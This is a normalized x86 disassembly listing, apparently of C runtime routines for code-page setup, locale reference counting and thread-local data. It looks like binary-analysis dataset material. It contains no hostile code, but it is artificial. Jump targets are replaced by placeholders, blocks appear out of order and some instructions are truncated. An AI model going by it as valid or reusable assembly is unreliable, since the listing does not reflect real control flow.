movzx cx [ edi ]
movzx ecx cx
movzx edx cl
inc edi
test [ edx + eax + 0x1d ] 0x4
mov [ ebp - 0x4 ] ecx
je r-xdata
cmp si [ eax + 0x18 ]
ja r-xdata
add si [ eax + 0x14 ]
jmp r-xdata
pop esi
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp + 0x10 ] ebx
jne r-xdata
cmp cx [ eax + 0x16 ]
jb r-xdata
cmp cx [ eax + 0x12 ]
ja r-xdata
add si [ eax + 0x1a ]
jmp r-xdata
mov ecx [ ebp + 0x8 ]
movzx cx [ ecx ]
dec [ ebp + 0x10 ]
inc [ ebp + 0x8 ]
movzx ecx cx
movzx edx cl
test [ edx + eax + 0x1d ] 0x4
mov [ ebp - 0x8 ] ecx
je r-xdata
cmp cx si
jne r-xdata
cmp cx [ eax + 0x18 ]
ja r-xdata
add cx [ eax + 0x14 ]
jmp r-xdata
add cx [ eax + 0x1a ]
jmp r-xdata
sub_4069a4
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x10 ]
call sub_404a6a
xor ebx ebx
cmp [ ebp + 0x8 ] ebx
jne r-xdata
push esi
mov esi [ ebp + 0xc ]
cmp esi ebx
jne r-xdata
call sub_407f64
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_407efc
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
push edi
mov edi [ ebp - 0xc ]
cmp [ edi + 0x8 ] ebx
jne r-xdata
call sub_407f64
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_407efc
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
mov eax [ ebp + 0x8 ]
movzx ax [ eax ]
inc [ ebp + 0x8 ]
movzx ecx ax
movzx eax cl
test [ eax + edi + 0x1d ] 0x4
je r-xdata
push esi
push [ ebp + 0x8 ]
call sub_40ea40
pop ecx
pop ecx
jmp r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
pop ebx
leave
retn
movzx ax [ esi ]
movzx eax ax
movzx edx al
inc esi
test [ edx + edi + 0x1d ] 0x4
je r-xdata
mov eax [ ebp + 0x8 ]
mov al [ eax ]
cmp al bl
jne r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
pop esi
cmp ax cx
jne r-xdata
mov dl [ esi ]
cmp dl bl
jne r-xdata
shl ecx 0x8
movzx ax al
or cx ax
inc [ ebp + 0x8 ]
movzx ecx cx
xor ecx ecx
jmp r-xdata
pop edi
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
sbb eax eax
and eax 0x2
dec eax
cmp cx bx
jne r-xdata
shl eax 0x8
movzx dx dl
or ax dx
movzx eax ax
inc esi
xor eax eax
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
xor eax eax
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub_406ae2
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x18 ]
call sub_404a6a
mov eax [ ebp - 0x14 ]
xor ebx ebx
cmp [ eax + 0x8 ] ebx
jne r-xdata
mov eax [ ebp + 0xc ]
cmp eax ebx
jne r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_404f40
pop ecx
pop ecx
cmp [ ebp - 0xc ] bl
je r-xdata
cmp [ eax ] bl
jne r-xdata
call sub_407f64
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_407efc
add esp 0x14
cmp [ ebp - 0xc ] bl
je r-xdata
pop ebx
leave
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
push esi
mov esi [ ebp + 0x8 ]
cmp esi ebx
jne r-xdata
cmp [ ebp - 0xc ] bl
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
push edi
push eax
mov edi esi
call sub_40bff0
mov [ ebp - 0x8 ] esi
sub [ ebp - 0x8 ] eax
push esi
call sub_40bff0
add eax [ ebp - 0x8 ]
pop ecx
pop ecx
cmp [ esi ] bl
je r-xdata
call sub_407f64
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_407efc
add esp 0x14
cmp [ ebp - 0xc ] bl
je r-xdata
mov eax [ ebp + 0x8 ]
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0xc ] bl
je r-xdata
sub esi [ ebp + 0xc ]
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
xor eax eax
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
mov dl [ edi ]
mov ecx [ ebp + 0xc ]
mov [ ebp - 0x1 ] dl
cmp dl bl
je r-xdata
pop esi
cmp [ ecx ] bl
je r-xdata
mov dl [ ecx ]
cmp dl bl
je r-xdata
cmp [ ebp - 0xc ] bl
je r-xdata
movzx ecx [ ebp - 0x1 ]
mov edx [ ebp - 0x14 ]
mov cl [ ecx + edx + 0x1d ]
and cl 0x4
inc edi
inc esi
test cl cl
je r-xdata
cmp [ esi + ecx ] dl
jne r-xdata
mov eax edi
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ edi ] bl
jne r-xdata
cmp [ edi ] bl
je r-xdata
inc ecx
cmp [ esi + ecx ] bl
jne r-xdata
pop edi
cmp edi eax
ja r-xdata
inc edi
inc esi
sub_406c3a
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
push ebx
xor ebx ebx
cmp [ ebp + 0x10 ] ebx
jne r-xdata
mov ecx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
cmp ecx ebx
je r-xdata
call sub_407f64
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_407efc
add esp 0x14
or eax 0xffffffff
jmp r-xdata
mov eax 0x7fffffff
mov [ ebp - 0x1c ] eax
cmp ecx eax
ja r-xdata
cmp esi ebx
jne r-xdata
pop ebx
leave
retn
push edi
push [ ebp + 0x18 ]
lea eax [ ebp - 0x20 ]
push [ ebp + 0x14 ]
mov [ ebp - 0x14 ] 0x42
push [ ebp + 0x10 ]
mov [ ebp - 0x18 ] esi
push eax
mov [ ebp - 0x20 ] esi
call sub_4081b7
add esp 0x10
mov edi eax
cmp esi ebx
je r-xdata
mov [ ebp - 0x1c ] ecx
call sub_407f64
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_407efc
add esp 0x14
or eax 0xffffffff
jmp r-xdata
pop edi
dec [ ebp - 0x1c ]
js r-xdata
pop esi
lea eax [ ebp - 0x20 ]
push eax
push ebx
call sub_407fad
pop ecx
pop ecx
mov eax [ ebp - 0x20 ]
mov [ eax ] bl
jmp r-xdata
mov eax edi
sub_406d0a
sub eax 0x3a4
je r-xdata
mov eax 0x411
retn
sub eax 0x4
je r-xdata
mov eax 0x804
retn
sub eax 0xd
je r-xdata
mov eax 0x412
retn
dec eax
je r-xdata
mov eax 0x404
retn
xor eax eax
retn
sub_406d39
mov edi edi
push esi
push edi
mov esi eax
push 0x101
xor edi edi
lea eax [ esi + 0x1c ]
push edi
push eax
call sub_40b0d0
xor eax eax
movzx ecx ax
mov eax ecx
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] edi
shl ecx 0x10
or eax ecx
lea edi [ esi + 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
mov ecx rw-data
add esp 0xc
lea eax [ esi + 0x1c ]
sub ecx esi
mov edi 0x101
mov dl [ ecx + eax ]
mov [ eax ] dl
inc eax
dec edi
jne r-xdata
lea eax [ esi + 0x11d ]
mov esi 0x100
mov dl [ eax + ecx ]
mov [ eax ] dl
inc eax
dec esi
jne r-xdata
pop edi
pop esi
retn
sub_406d9d
mov edi edi
push ebp
mov ebp esp
sub esp 0x51c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push edi
lea eax [ ebp - 0x518 ]
push eax
push [ esi + 0x4 ]
call [ GetCPInfo@IAT ]
mov edi 0x100
test eax eax
je r-xdata
lea eax [ esi + 0x11d ]
mov [ ebp - 0x51c ] 0xffffff9f
xor ecx ecx
sub [ ebp - 0x51c ] eax
xor eax eax
cmp edx 0x19
ja r-xdata
or [ esi + ecx + 0x1d ] 0x10
mov dl cl
add dl 0x20
jmp r-xdata
mov [ ebp + eax - 0x104 ] al
inc eax
cmp eax edi
jb r-xdata
mov al [ ebp - 0x512 ]
mov [ ebp - 0x104 ] 0x20
test al al
je r-xdata
mov [ eax ] 0x0
or [ esi + ecx + 0x1d ] 0x20
mov dl cl
sub dl 0x20
mov [ eax ] dl
jmp r-xdata
push 0x0
push [ esi + 0xc ]
lea eax [ ebp - 0x504 ]
push [ esi + 0x4 ]
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push 0x1
push 0x0
call sub_40ec82
xor ebx ebx
push ebx
push [ esi + 0x4 ]
lea eax [ ebp - 0x204 ]
push edi
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push edi
push [ esi + 0xc ]
push ebx
call sub_40b50f
add esp 0x44
push ebx
push [ esi + 0x4 ]
lea eax [ ebp - 0x304 ]
push edi
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push 0x200
push [ esi + 0xc ]
push ebx
call sub_40b50f
add esp 0x24
xor eax eax
lea ebx [ ebp - 0x511 ]
mov edx [ ebp - 0x51c ]
lea eax [ esi + ecx + 0x11d ]
add edx eax
lea ebx [ edx + 0x20 ]
cmp ebx 0x19
ja r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_4061c0
leave
retn
inc ecx
cmp ecx edi
jb r-xdata
test cl 0x2
je r-xdata
or [ esi + eax + 0x1d ] 0x10
mov cl [ ebp + eax - 0x204 ]
jmp r-xdata
inc ebx
mov al [ ebx ]
inc ebx
test al al
jne r-xdata
sub eax ecx
inc eax
push eax
lea edx [ ebp + ecx - 0x104 ]
push 0x20
push edx
call sub_40b0d0
add esp 0xc
mov [ esi + eax + 0x11d ] 0x0
or [ esi + eax + 0x1d ] 0x20
mov cl [ ebp + eax - 0x304 ]
mov [ esi + eax + 0x11d ] cl
jmp r-xdata
movzx ecx al
movzx eax [ ebx ]
cmp ecx eax
ja r-xdata
movzx ecx [ ebp + eax * 2 - 0x504 ]
test cl 0x1
je r-xdata
jmp r-xdata
inc eax
cmp eax edi
jb r-xdata
sub_406f30
push 0xc
push r--data
call sub_4099f4
call sub_4079da
mov edi eax
mov eax [ rw-data ]
test [ edi + 0x70 ] eax
je r-xdata
push 0xd
call sub_408efb
pop ecx
and [ ebp - 0x4 ] 0x0
mov esi [ edi + 0x68 ]
mov [ ebp - 0x1c ] esi
cmp esi [ rw-data ]
je r-xdata
cmp [ edi + 0x6c ] 0x0
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_406fcb
jmp r-xdata
test esi esi
je r-xdata
mov esi [ edi + 0x68 ]
test esi esi
jne r-xdata
mov eax [ rw-data ]
mov [ edi + 0x68 ] eax
mov esi [ rw-data ]
mov [ ebp - 0x1c ] esi
push esi
call [ InterlockedIncrement@IAT ]
push esi
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov eax esi
call sub_409a39
retn
push 0x20
call sub_4062c4
pop ecx
cmp esi rw-data
je r-xdata
push esi
call sub_404d8e
pop ecx
sub_406fd5
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
xor ebx ebx
push ebx
lea ecx [ ebp - 0x10 ]
call sub_404a6a
mov [ rw-data ] ebx
cmp esi 0xfffffffe
jne r-xdata
cmp esi 0xfffffffd
jne r-xdata
mov [ rw-data ] 0x1
call [ GetOEMCP@IAT ]
cmp esi 0xfffffffc
jne r-xdata
mov [ rw-data ] 0x1
call [ GetACP@IAT ]
jmp r-xdata
pop ebx
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x4 ]
mov [ rw-data ] 0x1
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax esi
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub_407051
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
push edi
call sub_406fd5
mov edi eax
xor esi esi
mov [ ebp + 0x8 ] edi
cmp edi esi
jne r-xdata
mov [ ebp - 0x1c ] esi
xor eax eax
mov eax ebx
call sub_406d39
push 0x101
lea eax [ ebx + 0x1c ]
push esi
push eax
call sub_40b0d0
mov ecx [ ebp - 0x1c ]
add esp 0xc
imul ecx ecx 0x30
mov [ ebp - 0x20 ] esi
lea esi [ ecx + rw-data ]
mov [ ebp - 0x1c ] esi
jmp r-xdata
inc [ ebp - 0x1c ]
add eax 0x30
cmp eax 0xf0
jb r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_4061c0
leave
retn
cmp [ esi ] 0x0
jne r-xdata
cmp [ eax + rw-data ] edi
je r-xdata
cmp edi 0xfde8
je r-xdata
mov al [ esi + 0x1 ]
test al al
je r-xdata
mov esi [ ebp - 0x1c ]
inc [ ebp - 0x20 ]
add esi 0x8
cmp [ ebp - 0x20 ] 0x4
mov [ ebp - 0x1c ] esi
jb r-xdata
or eax 0xffffffff
cmp edi 0xfde9
je r-xdata
movzx edi [ esi ]
movzx eax al
jmp r-xdata
mov eax edi
mov [ ebx + 0x4 ] edi
mov [ ebx + 0x8 ] 0x1
call sub_406d0a
push 0x6
mov [ ebx + 0xc ] eax
lea eax [ ebx + 0x10 ]
lea ecx [ ecx + rw-data ]
pop edx
movzx eax di
push eax
call [ IsValidCodePage@IAT ]
test eax eax
je r-xdata
cmp edi eax
jbe r-xdata
mov si [ ecx ]
inc ecx
mov [ eax ] si
inc ecx
inc eax
inc eax
dec edx
jne r-xdata
mov esi ebx
call sub_406d9d
jmp r-xdata
lea eax [ ebp - 0x18 ]
push eax
push edi
call [ GetCPInfo@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x20 ]
mov al [ eax + rw-data ]
or [ ebx + edi + 0x1d ] al
movzx eax [ esi + 0x1 ]
inc edi
mov edi [ ebp + 0x8 ]
inc esi
inc esi
xor eax eax
jmp r-xdata
cmp [ rw-data ] esi
jne r-xdata
push 0x101
lea eax [ ebx + 0x1c ]
push esi
push eax
call sub_40b0d0
xor edx edx
inc edx
add esp 0xc
mov [ ebx + 0x4 ] edi
mov [ ebx + 0xc ] esi
cmp [ ebp - 0x18 ] edx
jbe r-xdata
mov [ ebx + 0x8 ] esi
cmp [ ebp - 0x12 ] 0x0
je r-xdata
lea eax [ ebx + 0x1e ]
mov ecx 0xfe
lea esi [ ebp - 0x11 ]
or [ eax ] 0x8
inc eax
dec ecx
jne r-xdata
mov eax [ ebx + 0x4 ]
call sub_406d0a
mov [ ebx + 0xc ] eax
mov [ ebx + 0x8 ] edx
jmp r-xdata
movzx eax [ esi - 0x1 ]
movzx ecx cl
jmp r-xdata
xor eax eax
movzx ecx ax
mov eax ecx
shl ecx 0x10
or eax ecx
lea edi [ ebx + 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
cmp eax ecx
jbe r-xdata
or [ ebx + eax + 0x1d ] 0x4
inc eax
inc esi
inc esi
cmp [ esi - 0x1 ] 0x0
jne r-xdata
mov cl [ esi ]
test cl cl
je r-xdata
sub_407236
push 0x14
push r--data
call sub_4099f4
or [ ebp - 0x20 ] 0xffffffff
call sub_4079da
mov edi eax
mov [ ebp - 0x24 ] edi
call sub_406f30
mov ebx [ edi + 0x68 ]
mov esi [ ebp + 0x8 ]
call sub_406fd5
mov [ ebp + 0x8 ] eax
cmp eax [ ebx + 0x4 ]
je r-xdata
and [ ebp - 0x20 ] 0x0
push 0x220
call sub_40ecc4
pop ecx
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x20 ]
call sub_409a39
retn
mov ecx 0x88
mov esi [ edi + 0x68 ]
mov edi ebx
[ edi ] [ esi ]
and [ ebx ] 0x0
push ebx
push [ ebp + 0x8 ]
call sub_407051
pop ecx
pop ecx
mov [ ebp - 0x20 ] eax
test eax eax
jne r-xdata
cmp eax 0xffffffff
jne r-xdata
mov esi [ ebp - 0x24 ]
push [ esi + 0x68 ]
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
cmp ebx rw-data
je r-xdata
mov [ esi + 0x68 ] ebx
push ebx
mov edi [ InterlockedIncrement@IAT ]
call edi
test [ esi + 0x70 ] 0x2
jne r-xdata
mov eax [ esi + 0x68 ]
cmp eax rw-data
je r-xdata
call sub_407f64
mov [ eax ] 0x16
jmp r-xdata
push ebx
call sub_404d8e
pop ecx
test [ rw-data ] 0x1
jne r-xdata
push eax
call sub_404d8e
pop ecx
push 0xd
call sub_408efb
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ ebx + 0x4 ]
mov [ rw-data ] eax
mov eax [ ebx + 0x8 ]
mov [ rw-data ] eax
mov eax [ ebx + 0xc ]
mov [ rw-data ] eax
xor eax eax
xor eax eax
mov cx [ ebx + eax * 2 + 0x10 ]
mov [ eax * 2 + rw-data ] cx
inc eax
jmp r-xdata
xor eax eax
mov cl [ eax + ebx + 0x1c ]
mov [ eax + rw-data ] cl
inc eax
jmp r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x5
jge r-xdata
push [ rw-data ]
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov cl [ eax + ebx + 0x11d ]
mov [ eax + rw-data ] cl
inc eax
jmp r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x101
jge r-xdata
mov [ rw-data ] ebx
push ebx
call edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_407397
jmp r-xdata
mov eax [ rw-data ]
cmp eax rw-data
je r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x100
jge r-xdata
push eax
call sub_404d8e
pop ecx
sub_4073ee
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xbc ]
xor ebx ebx
push edi
cmp eax ebx
je r-xdata
mov eax [ esi + 0xc0 ]
cmp eax ebx
je r-xdata
cmp eax rw-data
je r-xdata
lea edi [ esi + 0xd4 ]
mov eax [ edi ]
cmp eax rw-data
je r-xdata
cmp [ eax ] ebx
jne r-xdata
mov eax [ esi + 0xb0 ]
cmp eax ebx
je r-xdata
lea edi [ esi + 0x50 ]
mov [ ebp + 0x8 ] 0x6
cmp [ eax + 0xb4 ] ebx
jne r-xdata
mov eax [ esi + 0xc4 ]
sub eax 0xfe
push eax
call sub_404d8e
mov eax [ esi + 0xcc ]
mov edi 0x80
sub eax edi
push eax
call sub_404d8e
mov eax [ esi + 0xd0 ]
sub eax edi
push eax
call sub_404d8e
push [ esi + 0xc0 ]
call sub_404d8e
add esp 0x10
cmp [ eax ] ebx
jne r-xdata
cmp [ edi - 0x4 ] ebx
je r-xdata
mov eax [ edi ]
cmp eax ebx
je r-xdata
push eax
call sub_40edf5
push [ edi ]
call sub_404d8e
pop ecx
pop ecx
mov eax [ esi + 0xb8 ]
cmp eax ebx
je r-xdata
add edi 0x10
dec [ ebp + 0x8 ]
jne r-xdata
mov eax [ edi + 0x4 ]
cmp eax ebx
je r-xdata
cmp [ eax ] ebx
jne r-xdata
mov eax [ esi + 0xb4 ]
cmp eax ebx
je r-xdata
cmp [ eax ] ebx
jne r-xdata
cmp [ edi - 0x8 ] rw-data
je r-xdata
push esi
call sub_404d8e
pop ecx
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ eax ] ebx
jne r-xdata
push eax
call sub_404d8e
pop ecx
push [ esi + 0xb0 ]
call sub_404d8e
push [ esi + 0xbc ]
call sub_404d8e
pop ecx
pop ecx
cmp [ eax ] ebx
jne r-xdata
push eax
call sub_404d8e
push [ esi + 0xbc ]
call sub_40efcf
pop ecx
pop ecx
push eax
call sub_404d8e
pop ecx
push eax
call sub_404d8e
push [ esi + 0xbc ]
call sub_40ef8a
pop ecx
pop ecx
sub_407537
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ InterlockedIncrement@IAT ]
push edi
mov edi [ ebp + 0x8 ]
push edi
call esi
mov eax [ edi + 0xb0 ]
test eax eax
je r-xdata
mov eax [ edi + 0xb8 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xb4 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xc0 ]
test eax eax
je r-xdata
push eax
call esi
lea ebx [ edi + 0x50 ]
mov [ ebp + 0x8 ] 0x6
push eax
call esi
cmp [ ebx - 0x4 ] 0x0
je r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
add ebx 0x10
dec [ ebp + 0x8 ]
jne r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
push eax
call esi
cmp [ ebx - 0x8 ] rw-data
je r-xdata
mov eax [ edi + 0xd4 ]
add eax 0xb4
push eax
call esi
pop edi
pop esi
pop ebx
pop ebp
retn
push eax
call esi
sub_4075c6
mov edi edi
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x8 ]
test edi edi
je r-xdata
mov eax edi
pop edi
pop ebp
retn
push ebx
push esi
mov esi [ InterlockedDecrement@IAT ]
push edi
call esi
mov eax [ edi + 0xb0 ]
test eax eax
je r-xdata
mov eax [ edi + 0xb8 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xb4 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xc0 ]
test eax eax
je r-xdata
push eax
call esi
lea ebx [ edi + 0x50 ]
mov [ ebp + 0x8 ] 0x6
push eax
call esi
cmp [ ebx - 0x4 ] 0x0
je r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
add ebx 0x10
dec [ ebp + 0x8 ]
jne r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
push eax
call esi
cmp [ ebx - 0x8 ] rw-data
je r-xdata
mov eax [ edi + 0xd4 ]
add eax 0xb4
push eax
call esi
pop esi
pop ebx
push eax
call esi
sub_40765f
test edi edi
je r-xdata
xor eax eax
retn
test eax eax
je r-xdata
push esi
mov esi [ eax ]
cmp esi edi
je r-xdata
mov eax edi
pop esi
retn
push edi
mov [ eax ] edi
call sub_407537
pop ecx
test esi esi
je r-xdata
push esi
call sub_4075c6
cmp [ esi ] 0x0
pop ecx
jne r-xdata
cmp esi rw-data
je r-xdata
push esi
call sub_4073ee
pop ecx
sub_40769d
push 0xc
push r--data
call sub_4099f4
call sub_4079da
mov esi eax
mov eax [ rw-data ]
test [ esi + 0x70 ] eax
je r-xdata
push 0xc
call sub_408efb
pop ecx
and [ ebp - 0x4 ] 0x0
lea eax [ esi + 0x6c ]
mov edi [ rw-data ]
call sub_40765f
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_407707
jmp r-xdata
cmp [ esi + 0x6c ] 0x0
je r-xdata
test esi esi
jne r-xdata
call sub_4079da
mov esi [ eax + 0x6c ]
mov eax esi
call sub_409a39
retn
push 0x20
call sub_4062c4
pop ecx
sub_407713
mov edi edi
push ebp
mov ebp esp
push esi
push [ rw-data ]
mov esi [ TlsGetValue@IAT ]
call esi
test eax eax
je r-xdata
mov esi r--data
push esi
call [ GetModuleHandleW@IAT ]
test eax eax
jne r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
push r--data
push eax
call [ GetProcAddress@IAT ]
push esi
call sub_406294
pop ecx
test eax eax
je r-xdata
push eax
push [ rw-data ]
call esi
call eax
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
pop esi
pop ebp
retn
push [ ebp + 0x8 ]
call eax
mov [ ebp + 0x8 ] eax
mov eax [ eax + 0x1f8 ]
jmp r-xdata
test eax eax
je r-xdata
sub_40778e
mov edi edi
push ebp
mov ebp esp
push esi
push [ rw-data ]
mov esi [ TlsGetValue@IAT ]
call esi
test eax eax
je r-xdata
mov esi r--data
push esi
call [ GetModuleHandleW@IAT ]
test eax eax
jne r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
push r--data
push eax
call [ GetProcAddress@IAT ]
push esi
call sub_406294
pop ecx
test eax eax
je r-xdata
push eax
push [ rw-data ]
call esi
call eax
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
pop esi
pop ebp
retn
push [ ebp + 0x8 ]
call eax
mov [ ebp + 0x8 ] eax
mov eax [ eax + 0x1fc ]
jmp r-xdata
test eax eax
je r-xdata
sub_407809
mov edi edi
push esi
push [ rw-data ]
call [ TlsGetValue@IAT ]
mov esi eax
test esi esi
jne r-xdata
mov eax esi
pop esi
retn
push [ rw-data ]
call sub_40778e
pop ecx
mov esi eax
push esi
push [ rw-data ]
call [ TlsSetValue@IAT ]
sub_40783d
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
push eax
push [ rw-data ]
call sub_40778e
pop ecx
call eax
or [ rw-data ] 0xffffffff
jmp sub_408dca
push eax
call [ TlsFree@IAT ]
or [ rw-data ] 0xffffffff
sub_40787a
push 0xc
push r--data
call sub_4099f4
mov esi r--data
push esi
call [ GetModuleHandleW@IAT ]
test eax eax
jne r-xdata
mov [ ebp - 0x1c ] eax
mov esi [ ebp + 0x8 ]
mov [ esi + 0x5c ] r--data
xor edi edi
inc edi
mov [ esi + 0x14 ] edi
test eax eax
je r-xdata
push esi
call sub_406294
pop ecx
mov [ esi + 0x70 ] edi
mov [ esi + 0xc8 ] 0x43
mov [ esi + 0x14b ] 0x43
mov [ esi + 0x68 ] rw-data
push 0xd
call sub_408efb
pop ecx
and [ ebp - 0x4 ] 0x0
push [ esi + 0x68 ]
call [ InterlockedIncrement@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40794f
push 0xc
call sub_408efb
pop ecx
mov [ ebp - 0x4 ] edi
mov eax [ ebp + 0xc ]
mov [ esi + 0x6c ] eax
test eax eax
jne r-xdata
push r--data
push eax
mov ebx [ GetProcAddress@IAT ]
call ebx
mov [ esi + 0x1f8 ] eax
push r--data
push [ ebp - 0x1c ]
call ebx
mov [ esi + 0x1fc ] eax
push [ esi + 0x6c ]
call sub_407537
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_407958
call sub_409a39
retn
mov eax [ rw-data ]
mov [ esi + 0x6c ] eax
sub_407961
mov edi edi
push esi
push edi
call [ GetLastError@IAT ]
push [ rw-data ]
mov edi eax
call sub_407809
call eax
mov esi eax
test esi esi
jne r-xdata
push edi
call [ SetLastError@IAT ]
pop edi
mov eax esi
pop esi
retn
push 0x214
push 0x1
call sub_40ed09
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
push esi
push [ rw-data ]
push [ rw-data ]
call sub_40778e
pop ecx
call eax
test eax eax
je r-xdata
push esi
call sub_404d8e
pop ecx
xor esi esi
push 0x0
push esi
call sub_40787a
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
jmp r-xdata
sub_4079f4
push 0x8
push r--data
call sub_4099f4
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_409a39
retn 0x4
mov eax [ esi + 0x24 ]
test eax eax
je r-xdata
mov eax [ esi + 0x2c ]
test eax eax
je r-xdata
push eax
call sub_404d8e
pop ecx
mov eax [ esi + 0x34 ]
test eax eax
je r-xdata
push eax
call sub_404d8e
pop ecx
mov eax [ esi + 0x3c ]
test eax eax
je r-xdata
push eax
call sub_404d8e
pop ecx
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
push eax
call sub_404d8e
pop ecx
mov eax [ esi + 0x44 ]
test eax eax
je r-xdata
push eax
call sub_404d8e
pop ecx
mov eax [ esi + 0x48 ]
test eax eax
je r-xdata
push eax
call sub_404d8e
pop ecx
mov eax [ esi + 0x5c ]
cmp eax r--data
je r-xdata
push eax
call sub_404d8e
pop ecx
push 0xd
call sub_408efb
pop ecx
and [ ebp - 0x4 ] 0x0
mov edi [ esi + 0x68 ]
test edi edi
je r-xdata
push eax
call sub_404d8e
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_407b0e
push 0xc
call sub_408efb
pop ecx
mov [ ebp - 0x4 ] 0x1
mov edi [ esi + 0x6c ]
test edi edi
je r-xdata
push edi
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_407b1a
push esi
call sub_404d8e
pop ecx
push edi
call sub_4075c6
pop ecx
cmp edi [ rw-data ]
je r-xdata
cmp edi rw-data
je r-xdata
cmp edi rw-data
je r-xdata
push edi
call sub_404d8e
pop ecx
cmp [ edi ] 0x0
jne r-xdata
push edi
call sub_4073ee
